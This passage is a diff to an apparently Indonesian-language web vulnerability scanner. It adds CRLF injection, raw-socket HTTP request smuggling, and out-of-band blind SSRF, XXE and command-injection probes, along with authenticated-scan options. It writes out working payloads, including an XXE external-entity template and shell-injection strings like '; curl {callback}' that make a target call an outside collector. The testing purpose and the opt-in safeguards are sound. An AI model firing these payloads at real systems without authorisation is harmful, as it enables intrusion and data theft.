+    dikirim lewat `params=` maka `%` ikut di-encode jadi `%250d` dan uji gagal.
+    """
+    head = url.split("#", 1)[0]
+    separator = "&" if urllib.parse.urlparse(head).query else "?"
+    return f"{head}{separator}{param}={payload}"
+
+def scan_crlf(sess, base_url, ctx=None):
+    """Uji CRLF injection / response splitting lewat parameter yang masuk ke header."""
+    f = FindingList(base_url); info("Menguji CRLF injection...")
+    paths = [join(base_url, path) for path in CRLF_TARGET_PATHS]
+    crawler = (ctx or {}).get("crawler")
+    if crawler and crawler.pages:
+        paths.extend(list(crawler.pages)[:2])
+    jobs = [(url, param, payload, label)
+            for url in paths
+            for param in CRLF_PARAMS[:CRLF_MAX_PARAMS]
+            for payload, label in CRLF_PAYLOADS][:CRLF_MAX_JOBS]
+    if not jobs:
+        return f
+    info(f"  {len(jobs)} kombinasi path/parameter/payload diuji")
+
+    def _check(job):
+        url, param, payload, label = job
+        try:
+            resp = sess.get(_raw_query_url(url, param, payload), timeout=10, allow_redirects=False)
+        except Exception:
+            return []
+        headers = {name.lower(): str(value) for name, value in resp.headers.items()}
+        if "x-spade-injected" in headers or "spade=1" in headers.get("set-cookie", ""):
+            return [("MEDIUM", "CRLF_INJECTION",
+                     f"Parameter '{param}' di {url} menyisipkan header respons baru lewat urutan CRLF "
+                     f"({label}). Penyerang bisa memecah respons (response splitting), menulis cookie palsu, "
+                     f"atau melakukan cache poisoning lewat XSS di header.",
+                     resp.url, f"CRLF injection terkonfirmasi di '{param}' ({label})", "firm")]
+        if "spade-injected" in (resp.text or "").lower():
+            return [("MEDIUM", "CRLF_INJECTION",
+                     f"Karakter CRLF dari parameter '{param}' di {url} muncul di body respons ({label}). "
+                     f"Perlu dikonfirmasi manual apakah urutan CRLF benar-benar memecah header respons di "
+                     f"reverse proxy/cache di depannya.",
+                     resp.url, f"Indikasi CRLF injection di '{param}' ({label})", "tentative")]
+        return []
+
+    # `pmap_until` mengembalikan hasil pertama yang truthy (yaitu list temuan dari
+    # `_check`), bukan daftar hasil — jadi tiap elemennya adalah satu temuan.
+    for sev, code, desc, url, message, confidence in pmap_until(_check, jobs) or []:
+        critical(message)
+        f.append((sev, code, desc, url), evidence_url=url, confidence=confidence)
+    return f
+
+def _smuggling_payloads(host, canary):
+    """Payload CL.TE dan TE.CL dengan path canary untuk membuktikan desync.
+
+    curl selalu menormalkan Content-Length/Transfer-Encoding, jadi payload ini
+    hanya bisa dikirim lewat socket mentah (`raw_http_probe`).
+    """
+    smuggled = (f"GET /{canary} HTTP/1.1\r\nHost: {host}\r\n"
+                f"X-Spade-Smuggled: 1\r\n\r\n")
+    cl_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+             f"Content-Length: {len(smuggled) + 5}\r\n"
+             f"Transfer-Encoding: chunked\r\n\r\n"
+             f"0\r\n\r\n" + smuggled)
+    te_cl = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
+             f"Content-Length: 4\r\n"
+             f"Transfer-Encoding: chunked\r\n\r\n"
+             f"1\r\nZ\r\n0\r\n\r\n" + smuggled)
+    return [("CL.TE", cl_te), ("TE.CL", te_cl)]
+
+def scan_smuggling(sess, base_url, ctx=None):
+    """Deteksi request smuggling CL.TE / TE.CL lewat koneksi socket mentah.
+
+    Uji ini merusak stream koneksi, jadi hanya jalan dengan `--check-smuggling`.
+    Tanpa flag, modul tetap muncul di daftar modul mode detailed tapi langsung
+    mengembalikan daftar kosong tanpa mengirim paket apa pun. Laporan hanya dibuat
+    kalau canary path benar-benar diproses sebagai request terpisah oleh server.
+    """
+    f = FindingList(base_url, capture=False)
+    if not _ctx_flag(ctx, "check_smuggling"):
+        return f
+    info("Menguji request smuggling (raw socket, CL.TE/TE.CL)...")
+    parsed = urllib.parse.urlparse(base_url)
+    # `netloc` (host:port) hanya untuk header Host; koneksi socket butuh hostname polos.
+    connect_host = parsed.hostname or parsed.netloc
+    netloc = parsed.netloc
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    use_tls = parsed.scheme == "https"
+    canary = "spade-smuggle-" + secrets.token_hex(4)
+
+    def _probe(job):
+        label, payload = job
+        raw = raw_http_probe(connect_host, port, payload, use_tls=use_tls, timeout=8.0)
+        if not raw:
+            return []
+        text = raw.decode("utf-8", "replace")
+        if canary not in text:
+            return []
+        return [("HIGH", "REQUEST_SMUGGLING",
+                 f"Server memproses request smuggling {label}: path canary yang dikirim sebagai bagian body ikut "
+                 f"dijalankan sebagai request terpisah (terlihat di respons mentah). Penyerang bisa membajak "
+                 f"request pengguna lain, melewati kontrol keamanan front-end, atau melakukan cache poisoning.",
+                 base_url, f"Request smuggling {label} terkonfirmasi", "firm")]
+
+    for out in pmap(_probe, _smuggling_payloads(netloc, canary)):
+        for sev, code, desc, url, message, confidence in out:
+            critical(message)
+            f.append((sev, code, desc, url), evidence_url=None, confidence=confidence)
+    return f
+
+# ── Out-of-band (OOB) — verifikasi blind SSRF/XXE/CMDi lewat collector sendiri ──
+
+XXE_OOB_TEMPLATE = ('<?xml version="1.0" encoding="UTF-8"?>'
+                    '<!DOCTYPE spade [<!ENTITY % spade SYSTEM "{callback}"> %spade;]>'
+                    '<spade>spade</spade>')
+CMDI_OOB_TEMPLATES = ("; curl {callback}", "| curl {callback}", "$(curl {callback})", "& curl {callback}")
+
+def _oob_enabled(ctx):
+    """Modul OOB hanya jalan kalau tester menyediakan --oob-host (collector sendiri)."""
+    return bool((ctx or {}).get("oob_host"))
+
+def _oob_collect(sess, ctx, probes):
+    """Tunggu sekali, lalu tanya collector untuk setiap token.
+
+    `probes` = daftar (token, url, label). Mengembalikan daftar (url, label, pesan)
+    hanya untuk token yang benar-benar menerima callback.
+    """
+    if not probes:
+        return []
+    time.sleep(OOB_CHECK_DELAY)
+    checker = (ctx or {}).get("anon_sess") or sess
+    host = (ctx or {}).get("oob_host")
+    hits = []
+    for token, url, label in probes:
+        ok, message = oob_check(checker, host, token)
+        if ok:
+            hits.append((url, label, message))
+    return hits
+
+def scan_oob_ssrf(sess, base_url, ctx=None):
+    """Blind SSRF yang dikonfirmasi lewat callback ke collector OOB (butuh --oob-host)."""
+    f = FindingList(base_url)
+    if not _oob_enabled(ctx):
+        return f
+    info("Menguji blind SSRF via callback OOB...")
+
+    def _probe(job):
+        path, param = job
+        token = oob_token()
+        try:
+            resp = sess.get(join(base_url, path), params={param: oob_callback_url(ctx["oob_host"], token)}, timeout=10)
+        except Exception:
+            return None
+        return token, resp.url, f"GET {path}?{param}=<callback>"
+
+    jobs = [(path, param) for path in OOB_SSRF_PATHS for param in ("url", "uri", "target")]
+    probes = [probe for probe in pmap(_probe, jobs) if probe]
+    hits = _oob_collect(sess, ctx, probes)
+    if not hits:
+        info("  Tidak ada callback SSRF diterima")
+    for url, label, message in hits:
+        warn(f"Blind SSRF terkonfirmasi: {label}")
+        f.append(("MEDIUM", "SSRF_BLIND",
+                  f"Target memproses URL yang dikirim penyerang dan menghubungi alamat di luar ({label}). "
+                  f"Callback diterima collector: {message}. Server bisa dipakai memindai jaringan internal, "
+                  f"membaca metadata cloud, atau menjangkau layanan internal.",
+                  url), evidence_url=url, confidence="firm")
+    return f
+
+def scan_oob_xxe(sess, base_url, ctx=None):
+    """Blind XXE yang dikonfirmasi lewat callback OOB (butuh --oob-host)."""
+    f = FindingList(base_url)
+    if not _oob_enabled(ctx):
+        return f
+    info("Menguji blind XXE via callback OOB...")
+
+    def _probe(path):
+        token = oob_token()
+        payload = XXE_OOB_TEMPLATE.format(callback=oob_callback_url(ctx["oob_host"], token))
+        url = join(base_url, path)
+        try:
+            sess.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=10)
+        except Exception:
+            return None
+        return token, url, f"POST {path} (XML external entity)"
+
+    probes = [probe for probe in pmap(_probe, list(OOB_XXE_PATHS)) if probe]
+    hits = _oob_collect(sess, ctx, probes)
+    if not hits:
+        info("  Tidak ada callback XXE diterima")
+    for url, label, message in hits:
+        warn(f"Blind XXE terkonfirmasi: {label}")
+        f.append(("HIGH", "XXE_BLIND",
+                  f"Parser XML di {url} memproses external entity dan menghubungi alamat penyerang ({label}). "
+                  f"Callback diterima collector: {message}. Dari sini data file server bisa dibaca atau "
+                  f"dilanjutkan jadi SSRF ke jaringan internal.",
+                  url), evidence_url=url, confidence="firm")
+    return f
+
+def scan_oob_cmdi(sess, base_url, ctx=None):
+    """Blind command injection yang dikonfirmasi lewat callback OOB (butuh --oob-host)."""
+    f = FindingList(base_url)
+    if not _oob_enabled(ctx):
+        return f
+    info("Menguji blind command injection via callback OOB...")
+
+    def _probe(job):
+        path, param, template = job
+        token = oob_token()
+        payload = template.format(callback=oob_callback_url(ctx["oob_host"], token))
+        try:
+            resp = sess.get(join(base_url, path), params={param: payload}, timeout=10)
+        except Exception:
+            return None
+        return token, resp.url, f"GET {path}?{param}=<command>"
+
+    jobs = [(path, param, template)
+            for path in OOB_CMDI_PATHS
+            for param in ("cmd", "host", "target", "exec")
+            for template in CMDI_OOB_TEMPLATES]
+    probes = [probe for probe in pmap(_probe, jobs) if probe]
+    hits = _oob_collect(sess, ctx, probes)
+    if not hits:
+        info("  Tidak ada callback CMDi diterima")
+    seen = set()
+    for url, label, message in hits:
+        # Beberapa template (`;`, `|`, `$(...)`) sering mengenai titik injeksi yang
+        # sama; cukup satu temuan per titik supaya laporan tidak berulang.
+        point = url.split("?", 1)[0]
+        if point in seen:
+            continue
+        seen.add(point)
+        critical(f"Blind command injection terkonfirmasi: {label}")
+        f.append(("CRITICAL", "CMDI_BLIND",
+                  f"Parameter di {url} diteruskan ke shell: server menjalankan perintah yang mengarah ke "
+                  f"collector penyerang ({label}). Callback diterima collector: {message}. Penyerang bisa "
+                  f"menjalankan perintah apa pun dengan hak akses web server.",
+                  url), evidence_url=url, confidence="firm")
+    return f
 
 # ── report ──
 SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
@@ -2247,6 +3698,12 @@ def gen_json(finds, target, out, scan=None):
             "modules": scan.get("modules", []),
             "errors": scan.get("errors", []),
             "redacted": REDACT_ENABLED,
+            # Status flag aktif: penting untuk audit karena mengubah cakupan uji
+            # (uji autentikasi, uji tulis, dan callback OOB tidak pernah default).
+            "auth": bool(scan.get("auth")),
+            "active_writes": bool(scan.get("active_writes")),
+            "check_smuggling": bool(scan.get("check_smuggling")),
+            "oob": bool(scan.get("oob")),
         },
         "summary": scan_summary(finds),
         "findings": [f.to_dict(EVIDENCE_SNIPPET_CHARS_JSON, None, impersonate) for f in finds],
@@ -2335,6 +3792,9 @@ def gen_sarif(finds, target, out, scan=None):
 # Format: key -> (label tampilan, fungsi scan(sess, base_url, ctx))
 ALL_MODULES = OrderedDict([
     ("tech",      ("Teknologi", tech_finger)),
+    ("idor",      ("IDOR/BOLA", scan_idor)),
+    ("csrf",      ("CSRF", scan_csrf)),
+    ("authbypass",("Auth Bypass", scan_auth_bypass)),
     ("headers",   ("Security Headers", sec_headers)),
     ("robots",    ("robots.txt", robots_txt)),
     ("sensitive", ("File Sensitif", sensitive_files)),
@@ -2350,6 +3810,7 @@ ALL_MODULES = OrderedDict([
     ("cmdi",      ("Command Injection", cmd_injection)),
     ("ssrf",      ("SSRF", ssrf_check)),
     ("ratelimit", ("Rate Limit", rate_limit)),
+    ("hostheader",("Host Header/Cache", scan_host_header)),
     ("xxe",       ("XXE", scan_xxe)),
     ("ssti",      ("SSTI", scan_ssti)),
     ("nosqli",    ("NoSQL Injection", scan_nosqli)),
@@ -2357,10 +3818,16 @@ ALL_MODULES = OrderedDict([
     ("js",        ("JS Analysis", scan_js)),
     ("jwt",       ("JWT", scan_jwt)),
     ("subdomains",("Subdomain", scan_subdomains)),
+    ("apispec",   ("API Spec", scan_api_specs)),
+    ("params",    ("Parameter Discovery", scan_params)),
+    ("crlf",      ("CRLF Injection", scan_crlf)),
+    ("smuggling", ("Request Smuggling", scan_smuggling)),
 ])
 
 QUICK_MODULES = ["tech","headers","robots","sensitive","cors","tls","ratelimit"]
-DETAILED_ONLY = {"xxe","ssti","nosqli","graphql","js","jwt","subdomains"}
+# Modul yang lebih lambat/intrusif hanya jalan di mode detailed.
+DETAILED_ONLY = {"xxe","ssti","nosqli","graphql","js","jwt","subdomains",
+                 "apispec","params","hostheader","crlf","smuggling"}
 STANDARD_MODULES = [k for k in ALL_MODULES if k not in DETAILED_ONLY]
 
 
@@ -2388,9 +3855,24 @@ def main(argv=None):
     parser.add_argument("--no-redact", action="store_true",
                         help="Matikan redaksi cookie/token/password di laporan. HATI-HATI: jangan dibagikan.")
     parser.add_argument("--quick", action="store_true", help="Mode cepat (7 modul, basic checks)")
-    parser.add_argument("--detailed", action="store_true", help="Mode lengkap (23 modul, crawl)")
+    parser.add_argument("--detailed", action="store_true",
+                        help="Mode lengkap (31 modul, crawl, param discovery, JWT, OOB)")
     parser.add_argument("--no-color", action="store_true", help="Output tanpa warna")
     parser.add_argument("--skip-ssl", action="store_true", help="Nonaktifkan verifikasi SSL (untuk sertifikat self-signed/expired)")
+    parser.add_argument("--cookie", action="append", default=[], metavar="N=V;M=X",
+                        help="Cookie sesi untuk area terautentikasi (boleh diulang). Dipakai modul IDOR, CSRF, JWT, dan auth bypass.")
+    parser.add_argument("-H", "--header", action="append", default=[], metavar="'Nama: nilai'",
+                        help="Header tambahan untuk semua request, mis. token API atau cookie (boleh diulang).")
+    parser.add_argument("--bearer", default="", metavar="TOKEN",
+                        help="Token Bearer untuk header Authorization (alternatif -H 'Authorization: ...').")
+    parser.add_argument("--jwt-secrets", default="", metavar="FILE",
+                        help="File daftar secret JWT (satu per baris) untuk diuji offline terhadap token yang ditemukan.")
+    parser.add_argument("--active-writes", action="store_true",
+                        help="Izinkan uji yang mengirim data (submit form CSRF dengan token palsu). Default: mati.")
+    parser.add_argument("--check-smuggling", action="store_true",
+                        help="Aktifkan uji request smuggling CL.TE/TE.CL lewat socket mentah. Hanya untuk target yang mengizinkan.")
+    parser.add_argument("--oob-host", default="", metavar="HOST",
+                        help="Host collector OOB milik tester (mis. 10.0.0.5:9000) untuk bukti blind SSRF/XXE/CMDi. Jalankan tools/oob_collector.py di sana.")
     parser.add_argument("--impersonate", default=DEFAULT_IMPERSONATE, metavar="PROFIL",
                         help=f"Profil browser curl_cffi untuk menyamarkan request (default: {DEFAULT_IMPERSONATE}). Contoh: chrome136, safari184, firefox147")
     parser.add_argument("--no-impersonate", action="store_true", help="Matikan browser impersonation (fingerprint default curl; untuk debugging/paritas)")
@@ -2412,6 +3894,32 @@ def main(argv=None):
         parser.error(f"profil impersonate '{args.impersonate}' tidak dikenal. "
                      f"Contoh yang valid: chrome146, safari184, firefox147, edge101 (total {len(profiles)} profil)")
 
+    # ── Validasi argumen autentikasi & OOB (semua sebelum request pertama) ──
+    try:
+        extra_headers = build_auth_headers(args.cookie, args.header, args.bearer)
+    except ValueError as exc:
+        parser.error(str(exc))
+    auth_enabled = bool(extra_headers)
+    jwt_secrets = []
+    if args.jwt_secrets:
+        try:
+            with open(args.jwt_secrets, encoding="utf-8") as handle:
+                jwt_secrets = [line.strip() for line in handle
+                               if line.strip() and not line.lstrip().startswith("#")]
+        except OSError as exc:
+            parser.error(f"tidak bisa membaca --jwt-secrets '{args.jwt_secrets}': {exc.strerror or exc}")
+        if not jwt_secrets:
+            parser.error(f"--jwt-secrets '{args.jwt_secrets}' tidak berisi satu baris pun (satu secret per baris)")
+    oob_host = oob_base(args.oob_host)
+    if args.oob_host and not oob_host:
+        parser.error("--oob-host kosong")
+    if args.oob_host:
+        hostpart = urllib.parse.urlparse(oob_host).hostname or ""
+        is_ip = bool(re.fullmatch(r"[0-9]{1,3}(\.[0-9]{1,3}){3}", hostpart or ""))
+        if not hostpart or not (is_ip or "." in hostpart or hostpart == "localhost" or ":" in args.oob_host):
+            parser.error(f"--oob-host '{args.oob_host}' bukan alamat yang bisa dihubungi target "
+                         f"(butuh host/IP/port, mis. 10.0.0.5:9000 atau collector.example.com)")
+
     # ── Interactive prompt jika target tidak diberikan ──
     if not args.target:
         print()
@@ -2429,8 +3937,8 @@ def main(argv=None):
         print()
         print("  Pilih mode scan:")
         print("    [1] Quick     — 7 modul, basic checks (cepat)")
-        print("    [2] Standard  — 16 modul, recommended (default)")
-        print("    [3] Detailed  — 23 modul, full scan dengan crawl + subdomain")
+        print("    [2] Standard  — 19 modul, recommended (default)")
+        print("    [3] Detailed  — 31 modul, full scan dengan crawl + subdomain")
         mode_ch = input("  [>] Pilih [1/2/3] (default: 2): ").strip()
         while mode_ch and mode_ch not in ("1","2","3"):
             mode_ch = input("  [>] Pilih 1, 2, atau 3: ").strip()
@@ -2455,12 +3963,30 @@ def main(argv=None):
     info(f"Target: {c('bold',target)}")
     info(f"Mode  : {mode.upper()}")
     info(f"Bot   : {args.impersonate or 'tanpa impersonation'}")
+    if auth_enabled:
+        info(f"Auth  : {_redact_auth_headers(extra_headers)}")
+        warn("Scan memakai sesi autentikasi — pastikan akun dan scope sudah diizinkan program.")
+    if oob_host:
+        info(f"OOB   : collector {oob_host}")
+        if urllib.parse.urlparse(oob_host).hostname == host_from_url(target).split(":")[0]:
+            warn("--oob-host menunjuk ke host target yang sama — collector tidak akan terlihat sebagai callback eksternal.")
+    if args.active_writes:
+        warn("ACTIVE WRITES ON — modul CSRF mengirim POST ke target (bisa mengubah data).")
+    if args.check_smuggling:
+        warn("REQUEST SMUGGLING ON — socket mentah CL.TE/TE.CL dikirim ke target.")
+    if jwt_secrets:
+        info(f"JWT   : {len(jwt_secrets)} secret tambahan dari {args.jwt_secrets}")
     info(f"Start : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print()
 
     verify_ssl = not args.skip_ssl
     set_request_executor(args.workers)
-    sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl, impersonate=args.impersonate)
+    sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl, impersonate=args.impersonate,
+                              extra_headers=extra_headers)
+    # Sesi anonim (tanpa kredensial) untuk pembanding: IDOR, auth bypass, cache deception,
+    # dan orakel token JWT butuh tahu respons apa yang diterima pengunjung tanpa login.
+    anon_sess = ThreadLocalSession(timeout=15, verify_ssl=verify_ssl,
+                                   impersonate=args.impersonate) if auth_enabled else None
     # Bukti (request/response) hanya boleh berasal dari scan yang sedang berjalan.
     reset_evidence()
     set_evidence_base_url(target)
@@ -2473,11 +3999,23 @@ def main(argv=None):
         "duration_s": None,
         "impersonate": args.impersonate,
         "workers": args.workers,
+        "auth": auth_enabled,
+        "active_writes": bool(args.active_writes),
+        "check_smuggling": bool(args.check_smuggling),
+        "oob": bool(oob_host),
         "modules": [],
         "errors": [],
         "redacted": bool(REDACT_ENABLED),
     }
-    ctx = {"crawler": None}
+    ctx = {
+        "crawler": None,
+        "auth_enabled": auth_enabled,
+        "anon_sess": anon_sess,
+        "active_writes": bool(args.active_writes),
+        "check_smuggling": bool(args.check_smuggling),
+        "oob_host": oob_host,
+        "jwt_secrets": jwt_secrets,
+    }
 
     wafs = waf_detect(sess, target, ctx)
     if wafs: info(f"WAF terdeteksi: {', '.join(wafs)}")
